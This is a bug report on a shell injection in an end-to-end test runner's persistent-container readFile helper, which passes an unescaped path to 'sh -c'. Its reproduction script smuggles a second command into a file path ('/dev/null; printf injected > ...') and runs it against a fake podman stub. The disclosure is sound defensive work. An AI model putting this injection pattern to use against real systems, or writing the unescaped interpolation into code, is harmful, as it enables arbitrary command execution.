# E2E persistent container readFile path shell injection executes commands

## Summary

`createPersistentContainer()` implements `Container.readFile(filePath)` by interpolating `filePath` into `cat <path>` executed through `sh -c`. A path containing shell control characters executes arbitrary additional commands during a read operation.

## Reproduction

1. From the repository root, save this disposable probe as `probe.mts`:

   ```ts
   import fs from "node:fs/promises";
   import os from "node:os";
   import path from "node:path";

   const root = await fs.mkdtemp(path.join(os.tmpdir(), "poe-persistent-read-inject-"));
   const fakeBin = path.join(root, "bin");
   const marker = path.join(root, "marker");
   await fs.mkdir(fakeBin, { recursive: true });
   await fs.writeFile(
     path.join(fakeBin, "podman"),
     `#!/bin/sh
   case "$1" in
     --version) echo fake; exit 0 ;;
     create) echo fake-container; exit 0 ;;
     start|rm) exit 0 ;;
     exec) shift; shift; shift 2; /bin/sh -c "$1" ;;
   esac
   `,
     { mode: 0o755 }
   );

   process.env.PATH = `${fakeBin}:${process.env.PATH}`;
   const { createPersistentContainer } = await import(
     "./packages/e2e-test-runner/src/persistent-container.ts"
   );
   const container = await createPersistentContainer({ image: "fake:image" });
   try {
     await container.readFile(`/dev/null; printf injected > ${marker}`);
     console.log(await fs.readFile(marker, "utf8"));
   } finally {
     await container.destroy();
   }
   ```

2. Execute it with `./node_modules/.bin/tsx ./probe.mts`.

## Observed Behavior

The probe prints `injected`: invoking a nominal file-read helper causes execution of the appended `printf` command. The fake engine evaluates the same `sh -c` payload that real Podman mode sends inside the container.

`Container.readFile()` delegates to `execQuiet(`cat ${filePath}`)` in `packages/e2e-test-runner/src/persistent-container.ts:392`; `execQuiet()` wraps the string in `sh -c` through `buildExecArgs()` without escaping `filePath`.

## Expected Behavior

`readFile(filePath)` should read only the specified file path and should never execute shell syntax embedded in its path argument.

## Impact

A path value passed to a read helper becomes arbitrary command execution inside the persistent E2E container. This can mutate test state or access resources exposed to the container even when a caller intended a read-only assertion.
